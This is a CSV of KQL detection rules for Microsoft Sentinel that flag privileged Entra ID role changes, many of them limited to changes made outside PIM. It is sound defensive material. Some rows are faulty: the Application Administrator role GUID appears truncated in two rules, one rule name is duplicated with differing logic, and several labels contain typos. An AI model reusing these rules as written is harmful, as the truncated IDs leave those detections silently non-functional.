,title,description,detectType,detectCon,detectLanguage,tags,attackTechnique,attackSoftware,references,pattern,dataSource,dataType,dataCollector,dataForwardTo,dataparser,dataParser,dataStorage,dataTable,dataIndex,dataAccess,dataMap,kqlVar,kqlTable,kqlQuery
11,rolemgt_pid_0040_any_hybrid_id_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage Active Directory to Microsoft Entra cloud provisioning, Microsoft Entra Connect, Pass-through Authentication (PTA), Password hash synchronization (PHS), Seamless Single sign-on (Seamless SSO), and federation settings.', 'Does not have access to manage Microsoft Entra Connect Health.', 'PIM Excluded']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '8ac3fc64-6eca-42ea-9e69-59f4c7b60eb2'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
12,rolemgt_pid_0032_any_exchange_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of the Exchange product', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '29232cdf-9323-42fd-ade2-1d097af3e4de'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
13,rolemgt_pid_0025_any_directory_reader,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read basic directory information. Commonly used to grant directory read access to applications and guests']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '88d8e3e3-8f55-4a1e-953a-9b9898b8876b'"
14,rolemgt_pid_0054_any_security_reader_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read security information and reports in Microsoft Entra ID and Office 365', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '5d6b6bb7-de71-4623-b4af-96380a352509'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
15,rolemgt_pid_0027_any_directory_writer,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read and write basic directory information. For granting access to applications, not intended for users.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '9360feb5-f418-4baa-8175-e2a00bac4301'"
16,rolemgt_pid_0036_any_groups_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Members of this role can create/manage groups, create/manage groups settings like naming and expiration policies, and view groups activity and audit reports.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'fdd7a751-b60b-444a-984c-02652fe8fa1c'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
17,rolemgt_pid_0017_any_cloudapp_security_admin,"['Any Entra ID Cloud App Security Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of the Defender for Cloud Apps product.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '892c5842-a9a6-463a-8041-72aa08ca3cf6'"
18,rolemgt_pid_0052_any_security_operator_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Creates and manages security events.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '5f2222b1-57c3-48ba-8ad5-d4759f1fde6f'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
19,rolemgt_pid_0026_any_directory_reader_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read basic directory information. Commonly used to grant directory read access to applications and guests', 'PIM Excluded']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '88d8e3e3-8f55-4a1e-953a-9b9898b8876b'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
20,rolemgt_pid_0031_any_exchange_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of the Exchange product']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '29232cdf-9323-42fd-ade2-1d097af3e4de'"
21,rolemgt_pid_0022_any_cloud_device_admin_not_pim,"['Any Entra ID Cloud Device Role Add, Remove, or Modify Activity', 'Limited access to manage devices in Microsoft Entra ID', 'PIM Exlcuded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '7698a772-787b-4ac8-901f-60d6b08affd2'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
22,rolemgt_pid_0057_any_directory_sync,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Only used by Microsoft Entra Connect service.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'd29b2b05-8046-44ba-8758-1e26182fcf32'"
23,rolemgt_pid_0007_any_auth_admin,"['Any Entra ID Auth Admin Role Add, Remove, or Modify Activity', 'Can access to view, set and reset authentication method information for any non-admin user.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'c4e39bd9-1100-46d3-8c65-fb160da0071f'"
24,rolemgt_pid_0033_any_global_reader,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read everything that a Global Administrator can, but not update anything.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'f2ef992c-3afb-46b9-b7cf-a126ee74c451'"
25,rolemgt_pid_0033_any_global_reader_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read everything that a Global Administrator can, but not update anything.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'f2ef992c-3afb-46b9-b7cf-a126ee74c451'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
26,rolemgt_pid_0028_any_directory_writer_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read and write basic directory information. For granting access to applications, not intended for users.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '9360feb5-f418-4baa-8175-e2a00bac4301'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
27,rolemgt_pid_0002_any_global_admin_not_pim,"['Any Entra ID Global Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of Microsoft Entra ID and Microsoft services that use Microsoft Entra identities', 'God Mode', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '62e90394-69f5-4237-9190-012177145e10'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
28,rolemgt_pid_00010_any_auth_policy_admin_not_pim,"['Any Entra ID Auth Policy Admin Role Add, Remove, or Modify Activity', 'Can create and manage the authentication methods policy, tenant-wide MFA settings, password protection policy, and verifiable credentials', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '0526716b-113d-4c15-b2c8-68e3c22b9f80'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
29,rolemgt_pid_0009_any_auth_policy_admin,"['Any Entra ID Auth Policy Admin Role Add, Remove, or Modify Activity', 'Can create and manage the authentication methods policy, tenant-wide MFA settings, password protection policy, and verifiable credentials']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '0526716b-113d-4c15-b2c8-68e3c22b9f80'"
30,rolemgt_pid_0049_any_security_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can read security information and reports, and manage configuration in Microsoft Entra ID and Office 365.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '194ae4cb-b126-40b2-bd5b-6091b380977d'"
31,rolemgt_pid_0044_any_password_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can reset passwords for non-administrators and Password Administrators.', 'PIM Excluded']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '966707d0-3269-4727-9be2-8c3a10f19b9d'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
32,rolemgt_pid_0029_any_domain_name_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage domain names in cloud and on-premises.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '8329153b-31d0-4727-b945-745eb3bc5f31'"
33,rolemgt_pid_0014_any_fed_keyset_admin,"['Any Entra IEF ID Auth Admin Role Add, Remove, or Modify Activity', 'Can manage secrets for federation and encryption in the Identity Experience Framework (IEF)', 'PIM Exclued']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'aaf43236-0c0d-4d5f-883a-6955382ac081'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
34,rolemgt_pid_0030_any_domain_name_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage domain names in cloud and on-premises.', 'PIM Excluded']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '8329153b-31d0-4727-b945-745eb3bc5f31'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
35,rolemgt_pid_0016_any_billing_admin_not_pim,"['Any Entra ID Billing Admin Role Add, Remove, or Modify Activity', 'Can perform common billing related tasks like updating payment information', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'b0f54661-2d74-4c50-afa3-1ec803f12efe'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
36,rolemgt_pid_0045_any_priv_auth_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can access to view, set and reset authentication method information for any user (admin or non-admin).']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '7be44c8a-adaf-4e2a-84d6-ab2649e08a13'"
37,rolemgt_pid_0006_any_app_admin_not_pim,"['Any Entra ID App Developer Admin Role Add, Remove, or Modify Activity', ""Can create application registrations independent of the 'Users can register applications' setting"", 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'cf1c38e5-3621-4004-a7cb-879624dced7c'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
38,rolemgt_pid_0047_any_priv_role_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Entra ID, and all aspects of Privileged Identity Management']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'e8611ab8-c189-46e8-94e1-60213ab1f814'"
39,rolemgt_pid_0001_any_global_admin,"['Any Entra ID Global Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of Microsoft Entra ID and Microsoft services that use Microsoft Entra identities.', 'God Mode']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '62e90394-69f5-4237-9190-012177145e10'"
40,rolemgt_pid_0055_any_user_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of users and groups, including resetting passwords for limited admins.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'fe930be7-5e62-47db-91af-98c3a49a38b1'"
41,rolemgt_pid_0021_any_cloud_device_admin,"['Any Entra ID Cloud Device Role Add, Remove, or Modify Activity', 'Limited access to manage devices in Microsoft Entra ID.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '7698a772-787b-4ac8-901f-60d6b08affd2'"
42,rolemgt_pid_0003_any_app_admin,"['Any Entra ID App Admin Role Add, Remove, or Modify Activity', 'Can create and manage all aspects of app registrations and enterprise apps.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3'"
43,rolemgt_pid_0038_any_helpdesk_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can reset passwords for non-administrators and Helpdesk Administrators.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '729827e3-9c14-49f7-bb1b-9608f156bbb8'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
44,rolemgt_pid_0005_any_app_dev,"['Any Entra ID App Developer Role Add, Remove, or Modify Activity', ""Can create application registrations independent of the 'Users can register applications' setting""]",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'cf1c38e5-3621-4004-a7cb-879624dced7c'"
45,rolemgt_pid_0019_any_cloudapp_admin,"['Any Entra ID Cloud App Role Add, Remove, or Modify Activity', 'Can create and manage all aspects of app registrations and enterprise apps except application proxy.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '158c047a-c907-4556-b7ef-446551a6b5f7'"
46,rolemgt_pid_0055_any_user_admin_pim_excluded,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of users and groups, including resetting passwords for limited admins.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'fe930be7-5e62-47db-91af-98c3a49a38b1'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
47,rolemgt_pid_0041_any_intune_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of the Intune product.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '3a2c62db-5318-420d-8d74-23affee5d9d5'"
48,rolemgt_pid_0024_any_cap_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage Conditional Access capabilities.', 'PIM Excluded']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'b1be1c3e-b65d-4f19-8427-f6fa0d97feb9'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
49,rolemgt_pid_0004_any_app_admin_not_pim,"['Any Entra ID App Admin Role Add, Remove, or Modify Activity', 'Can create and manage all aspects of app registrations and enterprise apps.', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
50,rolemgt_pid_0008_any_auth_admin_not_pim,"['Any Entra ID Auth Admin Role Add, Remove, or Modify Activity', 'Can access to view, set and reset authentication method information for any non-admin user', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'c4e39bd9-1100-46d3-8c65-fb160da0071f'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
51,rolemgt_pid_0058_any_tier_support,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Do not use - not intended for general use.']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '4ba39ca4-527c-499a-b93d-d9b492c50246'
  or TargetResources contains 'e00e864a-17c5-4a4b-9c06-f5b95a8d5bd8'"
52,rolemgt_pid_0017_any_cloudapp_security_admin,"['Any Entra ID Cloud App Security Admin Role Add, Remove, or Modify Activity', 'Can manage all aspects of the Defender for Cloud Apps product', 'PIM Excluded']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '892c5842-a9a6-463a-8041-72aa08ca3cf6'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
